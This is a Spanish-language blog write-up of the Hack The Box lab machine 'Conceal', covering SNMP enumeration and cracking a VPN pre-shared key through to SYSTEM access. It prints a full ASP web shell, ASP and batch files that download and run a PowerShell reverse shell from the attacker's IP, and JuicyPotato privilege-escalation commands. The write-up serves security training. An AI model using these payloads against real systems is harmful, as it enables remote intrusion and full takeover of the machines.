<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Conceal :: sckull — HackTheBox Writeups, CTF</title>    
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="MASSCAN masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-27 00:03:27 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 161/udp on 10.10.10.116&amp;lt;/pre&amp;gt;  SNMP PORT Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.
[*] System information: Host IP : 10.10.10.116 Hostname : Conceal Description : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/conceal/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Conceal :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="MASSCAN masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-27 00:03:27 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 161/udp on 10.10.10.116&amp;lt;/pre&amp;gt;  SNMP PORT Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.
[*] System information: Host IP : 10.10.10.116 Hostname : Conceal Description : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/htb/conceal/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Conceal :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="MASSCAN masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-27 00:03:27 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 161/udp on 10.10.10.116&amp;lt;/pre&amp;gt;  SNMP PORT Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.
[*] System information: Host IP : 10.10.10.116 Hostname : Conceal Description : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6." />
<meta property="og:url" content="https://sckull.github.io/posts/conceal/" />
<meta property="og:site_name" content="Hack The Box - Conceal" />
<meta property="og:image" content="https://sckull.github.io/image/htb/conceal/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Conceal",
        "headline" : "Hack The Box - Conceal",
        "description" : "MASSCAN masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-27 00:03:27 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 161/udp on 10.10.10.116&lt;/pre&gt;  SNMP PORT Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.
[*] System information: Host IP : 10.10.10.116 Hostname : Conceal Description : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-05-19 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-05-19 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/conceal/",
        "wordCount" : "1061",
        "keywords" : [ "hackthebox","windows","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-05-19 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Conceal</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Sunday, May 19, 2019
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 5 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/windows/"><li class="fa fa-tag"></li> windows</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/conceal/../../image/htb/conceal/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#masscan">MASSCAN</a></li>
<li><a href="#snmp-port">SNMP PORT</a></li>
<li><a href="#ike-vpn-password-psk">IKE VPN password PSK</a></li>
<li><a href="#setup-ipsec-ike-vpn">SETUP IPSEC - IKE VPN</a></li>
<li><a href="#status-ipsec">STATUS IPSEC</a>
<ul>
<li><a href="#nmap-ipsec">NMAP - IPSEC</a></li>
<li><a href="#smb-ipsec">SMB - IPSEC</a></li>
<li><a href="#rpc-ipsec">RPC - IPSEC</a></li>
<li><a href="#ftp-ipsec">FTP - IPSEC</a></li>
</ul></li>
<li><a href="#http-ipsec">HTTP - IPSEC</a>
<ul>
<li><a href="#upload">/upload</a></li>
</ul></li>
<li><a href="#webshell">WEBSHELL</a>
<ul>
<li>
<ul>
<li><a href="#webshell-1">WEBSHELL</a></li>
</ul></li>
</ul></li>
<li><a href="#reverse-shell-nishang">REVERSE SHELL - Nishang</a></li>
<li><a href="#user">USER</a>
<ul>
<li><a href="#systeminfo">Systeminfo</a></li>
<li><a href="#sherlok">Sherlok</a></li>
<li><a href="#whoami-priv">WHOAMI /priv</a></li>
</ul></li>
<li><a href="#privilege-escalation-juicypotato">PRIVILEGE ESCALATION - JuicyPotato</a>
<ul>
<li><a href="#clsid">CLSID</a></li>
<li><a href="#lista-clsid">Lista CLSID</a></li>
</ul></li>
<li><a href="#root">ROOT</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<hr />

<h2 id="masscan">MASSCAN</h2>

<pre><code class="language-bash">masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-27 00:03:27 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 161/udp on 10.10.10.116&lt;/pre&gt;
</code></pre>

<hr />

<h2 id="snmp-port">SNMP PORT</h2>

<p>Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.</p>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-05 01.45.55.png" alt="image" /></p>

<pre><code class="language-vim">[*] System information:

Host IP                       : 10.10.10.116
Hostname                      : Conceal
Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
Location                      : -
Uptime snmp                   : 00:10:11.23
Uptime system                 : 00:09:45.96
System date                   : 2019-3-2 04:26:04.7
</code></pre>

<hr />

<h2 id="ike-vpn-password-psk">IKE VPN password PSK</h2>

<p>Utilizamos el wordlist rockyou y hashcat para desencriptar la contraseña.</p>

<pre><code class="language-bash">9c8b1a372b1878851be2c097031b6e43 NTLM : Dudecake1!
</code></pre>

<hr />

<h2 id="setup-ipsec-ike-vpn">SETUP IPSEC - IKE VPN</h2>

<p>Utilizamos strongswan para poder conectarnos mediante una VPN IKE y su configuracion es la siguiente.</p>

<p>Instalamos strongswan:</p>

<pre><code class="language-bash">sudo apt install strongswan
</code></pre>

<p>Configuramos los siguientes archivos.</p>

<p><code>[/etc/ipsec.conf]</code></p>

<pre><code class="language-vim">conn conceal
	authby=secret
	auto=route
	ike=3des-sha1-modp1024
	left=10.10.12.184
	right=10.10.10.116
	keyexchange=ikev1
	type=transport
	esp=3des-sha1 
	rightprotoport=tcp
</code></pre>

<p><code>[/etc/ipsec.secrets]</code></p>

<pre><code class="language-vim">10.10.12.184 : PSK &quot;Dudecake1!&quot;
10.10.10.116 : PSK &quot;Dudecake1!&quot;
</code></pre>

<hr />

<h2 id="status-ipsec">STATUS IPSEC</h2>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-05 01.40.51.png" alt="image" /></p>

<h3 id="nmap-ipsec">NMAP - IPSEC</h3>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-05 01.40.22.png" alt="image" /></p>

<h3 id="smb-ipsec">SMB - IPSEC</h3>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-05 01.38.46.png" alt="image" /></p>

<h3 id="rpc-ipsec">RPC - IPSEC</h3>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-05 01.39.36.png" alt="image" /></p>

<h3 id="ftp-ipsec">FTP - IPSEC</h3>

<p>Nos conectamos como usuario anonymous pero no encontramos nada dentro.
<img src="../../image/htb/conceal/Screenshot from 2019-04-05 01.50.35.png" alt="image" /></p>

<h2 id="http-ipsec">HTTP - IPSEC</h2>

<p>Enumerando con gobuster encontramos solo una direccion.
<img src="../../image/htb/conceal/Screenshot from 2019-04-05 01.47.40.png" alt="image" /></p>

<h3 id="upload">/upload</h3>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-05 01.55.02.png" alt="image" /></p>

<hr />

<h2 id="webshell">WEBSHELL</h2>

<p>Para obtener una webshell utilizamos ftp para subir nuestra webshell y visitar /upload/cmd.asp para interactuar con este.</p>

<h4 id="webshell-1">WEBSHELL</h4>

<p><a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp">https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp</a></p>

<pre><code class="language-html">&lt;%
Set oScript = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
Set oScriptNet = Server.CreateObject(&quot;WSCRIPT.NETWORK&quot;)
Set oFileSys = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject(&quot;WScript.Shell&quot;)
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&gt;


&lt;HTML&gt;
&lt;BODY&gt;
&lt;FORM action=&quot;&quot; method=&quot;GET&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=45 value=&quot;&lt;%= szCMD %&gt;&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Run&quot;&gt;
&lt;/FORM&gt;
&lt;PRE&gt;
&lt;%= &quot;\\&quot; &amp; oScriptNet.ComputerName &amp; &quot;\&quot; &amp; oScriptNet.UserName %&gt;
&lt;%Response.Write(Request.ServerVariables(&quot;server_name&quot;))%&gt;
&lt;p&gt;
&lt;b&gt;The server's port:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables(&quot;server_port&quot;))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables(&quot;server_software&quot;))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables(&quot;LOCAL_ADDR&quot;))%&gt;
&lt;% szCMD = request(&quot;cmd&quot;)
thisDir = getCommandOutput(&quot;cmd /c&quot; &amp; szCMD)
Response.Write(thisDir)%&gt;
&lt;/p&gt;
&lt;br&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</code></pre>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-08 19.07.12.png" alt="image" /></p>

<p>Obtenemos nuestra webshell y podemos ejecutar comandos en la maquina.</p>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-08 19.08.12.png" alt="image" /></p>

<hr />

<h2 id="reverse-shell-nishang">REVERSE SHELL - Nishang</h2>

<p>Utilizamos una de las shells que tiene nishang <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a>, y configuramos un archivo asp para subirlo por ftp y al visitar dicho archivo obtener una shell inversa.</p>

<p>En nuestro archivo <code>Invoke-PowerShellTcp.ps1</code> agregamos la sigueinte linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.</p>

<pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.188 -Port 443
</code></pre>

<p>Nuestro archivo <code>rev_shell.asp</code> contiene lo siguiente.</p>

<pre><code class="language-html">&lt;%@ Language=VBScript %&gt;
&lt;%
  call Server.CreateObject(&quot;WSCRIPT.SHELL&quot;).Run(&quot;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.188/Invoke-PowerShellTcp.ps1')&quot;)
%&gt;
</code></pre>

<video autoplay>
    <source src="../../image/htb/conceal/Screen record from 2019-04-09 22.18.36.mov" type="video/mp4">
</video>

<hr />

<h2 id="user">USER</h2>

<p>Obtenemos nuestra bandera <code>user.txt</code>.
<img src="../../image/htb/conceal/Screenshot from 2019-04-09 23.33.44.png" alt="image" /></p>

<h3 id="systeminfo">Systeminfo</h3>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-09 23.59.58.png" alt="image" /></p>

<h3 id="sherlok">Sherlok</h3>

<p>Utilizando Sherlok para buscar parches que nos pueda servir para escalar privilegios, no encontramos ninguno :/.</p>

<pre><code class="language-shell">PS C:\Users\Destitute\Documents&gt; iex(new-object net.webclient).downloadstring('http://10.10.14.188/Sherlok.ps1')
PS C:\Users\Destitute\Documents&gt; ls
PS C:\Users\Destitute\Documents&gt; Find-Allvulns


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
</code></pre>

<h3 id="whoami-priv">WHOAMI /priv</h3>

<p>Revisamos si <code>SeImpersonatePrivilege</code> esta disponible en la maquina y con el usuario que actualmente tenemos una shell para poder utilizar <code>JuicyPotato</code> para obtener <code>NT AUTHORITY\SYSTEM</code>.</p>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-09 23.35.13.png" alt="image" /></p>

<hr />

<h2 id="privilege-escalation-juicypotato">PRIVILEGE ESCALATION - JuicyPotato</h2>

<p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a>
Para escalar privilegios vamos a utilizar un nuevo documento <code>Invoke-PowerShellTcp-potato.ps1</code> que contiene una shell inversa, tambien un archivo <code>reverse_shell.bat</code> el cual va ser ejecutado por <code>JuicyPotato.exe</code> (<a href="https://ohpe.it/juicy-potato/">https://ohpe.it/juicy-potato/</a>), se puede descargar <code>JuicyPotato.exe</code> aqui. (<a href="https://ohpe.it/juicy-potato/">https://ohpe.it/juicy-potato/</a>).</p>

<p><code>reverse_shell.bat</code></p>

<pre><code class="language-powershell">powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.12.64/Invoke-PowerShellTcp-potato.ps1')
</code></pre>

<h3 id="clsid">CLSID</h3>

<p>Para obtener CLSID para juicypotato vamos a utilizar los siguientes comandos en powershell.</p>

<pre><code class="language-powershell">New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
$CLSID
</code></pre>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-10 00.29.40.png" alt="image" /></p>

<p>Nos imprimira un alista de <code>AppID</code> y <code>CLSID</code>, copiamos y guardamos los <code>CLSID</code> en un archivo para probar cada uno de ellos con el archivo <code>test_clsid.bat</code> de <code>juicypotato</code>. (<a href="https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat">https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat</a>)</p>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-10 00.38.39.png" alt="image" /></p>

<p>Vamos a hacer un pequeño cambio en nuestro archivo <code>test_clsid.bat</code>, solo cambiamos la ruta de nuestros archivos.</p>

<pre><code class="language-shell">@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (C:\Users\Destitute\Videos\tmp.list) DO (
   echo %%i !port!
   C:\Users\Destitute\Videos\JuicyPotato.exe -z -l !port! -c %%i &gt;&gt; C:\Users\Destitute\Videos\result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
)
</code></pre>

<p>Descargamos los archivos necesarios en la maquina.</p>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-10 00.46.21.png" alt="image" /></p>

<p>Ejecutamos <code>test_clsid.bat</code>, el cual nos creara un archivo log (<code>result.log</code>) con las pruebas de <code>CLSID</code> que hay en la lista que creamos anteriormente.</p>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-10 01.03.30.png" alt="image" /></p>

<h3 id="lista-clsid">Lista CLSID</h3>

<pre><code class="language-shell">7c5-91bf-4547-81ae-fec91a89dec5};CONCEAL\Destitute
{0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\LOCAL SERVICE
{1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\LOCAL SERVICE
{204810b9-73b2-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{2e5e84e9-4049-4244-b728-2d24227157c7};NT AUTHORITY\LOCAL SERVICE
{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7};NT AUTHORITY\SYSTEM
{42C21DF5-FB58-4102-90E9-96A213DC7CE8};NT AUTHORITY\SYSTEM
{42CBFAA7-A4A7-47BB-B422-BD10E9D02700};NT AUTHORITY\SYSTEM
{4661626C-9F41-40A9-B3F5-5580E80CB347};NT AUTHORITY\SYSTEM
{4B6C85F1-A6D9-433A-9789-89EA153626ED};NT AUTHORITY\SYSTEM
{6d8ff8d2-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8dc-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8dd-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8df-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8e1-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8e5-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8e7-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39};NT AUTHORITY\SYSTEM
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
{9678f47f-2435-475c-b24a-4606f8161c16};CONCEAL\Destitute
{97061DF1-33AA-4B30-9A92-647546D943F3};NT AUTHORITY\SYSTEM
{98068995-54d2-4136-9bc9-6dbcb0a4683f};CONCEAL\Destitute
{9acf41ed-d457-4cc1-941b-ab02c26e4686};CONCEAL\Destitute
{9E175B68-F52A-11D8-B9A5-505054503030};NT AUTHORITY\SYSTEM
{9E175B6D-F52A-11D8-B9A5-505054503030};NT AUTHORITY\SYSTEM
{A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\LOCAL SERVICE
{A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6};NT AUTHORITY\SYSTEM
{B31118B2-1F49-48E5-B6F5-BC21CAEC56FB};NT AUTHORITY\SYSTEM
{B52D54BB-4818-4EB9-AA80-F9EACD371DF8};NT AUTHORITY\SYSTEM
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM
{C63261E4-6052-41FF-B919-496FECF4C4E5};NT AUTHORITY\SYSTEM
{CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\SYSTEM
{E48EDA45-43C6-48e0-9323-A7B2067D9CD5};NT AUTHORITY\SYSTEM
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM
{E63DE750-3BD7-4BE5-9C84-6B4281988C44};NT AUTHORITY\SYSTEM
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};NT AUTHORITY\SYSTEM
</code></pre>

<p>Vamos a utilizar un CLSID (<code>{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}</code>) con <code>NT AUTHORITY\SYSTEM</code> y una shell inversa (<code>reverse_shell.bat</code>).</p>

<pre><code class="language-powershell">.\JuicyPotato.exe -l 1227 -p C:\Users\Destitute\Videos\reverse_shell.bat -t * -c '{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};'
</code></pre>

<p>De igual manera podemos utilizar uno de la lista que JuicyPotato tiene en su lista de Windows 10 Enterprise (<a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise</a>).</p>

<hr />

<h2 id="root">ROOT</h2>

<video autoplay>
    <source src="../../image/htb/conceal/Screen record from 2019-04-10 01.38.15.mov">
</video>

<p>Obtenemos una shell <code>NT AUTHORITY\SYSTEM</code> o root :)</p>

<p>Y nuestra bandera <code>root.txt</code>.</p>

<p><img src="../../image/htb/conceal/Screenshot from 2019-04-10 01.40.23.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/chaos/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Chaos</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/owasp2019/">
                <span class="button__text">OWASP CTF 2019 Guatemala - Writeup</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
